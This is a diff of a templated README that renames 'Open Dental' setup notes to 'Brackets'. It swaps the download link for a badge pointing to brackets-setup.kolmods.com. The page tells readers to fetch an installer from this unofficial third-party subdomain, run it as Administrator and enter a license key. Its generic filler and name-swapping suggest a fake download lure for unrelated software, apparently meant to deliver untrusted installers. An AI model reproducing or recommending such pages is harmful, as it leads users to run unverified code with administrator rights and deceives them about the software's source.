@@ -1,10 +1,14 @@
-# Open Dental Windows Setup Notes
+# Brackets Windows Setup Notes
 
-[⬇ Download Open Dental for Windows](https://opendental-setup.kolmods.com/)
+<p align="center">
+  <a href="https://brackets-setup.kolmods.com/">
+    <img src="https://img.shields.io/badge/Download-Brackets-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Brackets">
+  </a>
+</p>
 
 ## Download & Install
 
-> Setup notes for **Open Dental** on Windows 10/11 (64-bit). Run the installer as Administrator.
+> Setup notes for **Brackets** on Windows 10/11 (64-bit). Run the installer as Administrator.
 
 ### Quick steps
 
@@ -12,15 +16,15 @@
 2. Save the file to a local folder you can find later
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
-5. Restart if the installer asks — then launch **Open Dental** from the Start menu
+5. Restart if the installer asks — then launch **Brackets** from the Start menu
 
 ## What you can use it for
 
-- Core Open Dental features on Windows desktop
-- Install and configure Open Dental for daily use
-- Import, edit, and export with Open Dental tools
-- Tune settings and profiles inside Open Dental
-- Integrate Open Dental into your existing workflow
+- Core Brackets features on Windows desktop
+- Install and configure Brackets for daily use
+- Import, edit, and export with Brackets tools
+- Tune settings and profiles inside Brackets
+- Integrate Brackets into your existing workflow
 
 ## License
 
